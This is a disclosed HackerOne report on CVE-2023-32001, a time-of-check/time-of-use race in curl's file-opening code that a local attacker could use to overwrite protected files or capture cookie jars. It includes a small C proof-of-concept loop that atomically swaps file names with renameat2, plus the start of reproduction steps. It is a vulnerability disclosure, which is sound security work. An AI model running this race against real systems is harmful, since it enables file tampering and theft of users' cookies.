# [M] CVE-2023-32001: fopen race condition

## Summary
Severity: Medium
Program: curl
Weakness: Time-of-check Time-of-use (TOCTOU) Race Condition
Reporter: selmelc
State: resolved
Disclosed: 2023-07-25T05:00:08.873Z
CVE: CVE-2023-32001
Source: https://hackerone.com/reports/2039870

## Details
As we can see in the following curl code (line 59-61 https://github.com/curl/curl/blob/fb802b521af997230b65174a559f5c419520e142/lib/fopen.c ): 
```C
  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
    /* a non-regular file, fallback to direct fopen() */
    *fh = fopen(filename, FOPEN_WRITETEXT);
...
}
...
```
There is a race condition between the moment "stat(filename, &sb)" is executed and the moment " fopen(filename, FOPEN_WRITETEXT);" is executed.
This leads to undesirable behavior such as an attacker tricking a privileged user to overwrite protected files, or since this function (Curl_fopen) is also used for storing cookies an attacker could trick another user to send those cookies that might be very sensible to a file fully owned and controlled by the attacker.

###POC/Steps to reproduce:
Before we start, I will be using a little program called "rename". Which simply swaps atomically the names of two files to be able to showcase this race condition. Here is its code :
```
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

Open two terminals, with two different users. One will be the attacker terminal and the other the victim. 
In both POCs, the victim  will want to execute a command such as "curl --cookie-jar a google.com" thinking the file "a" doesn't exist.

_Trimmed to 38 lines — full report: https://hackerone.com/reports/2039870_
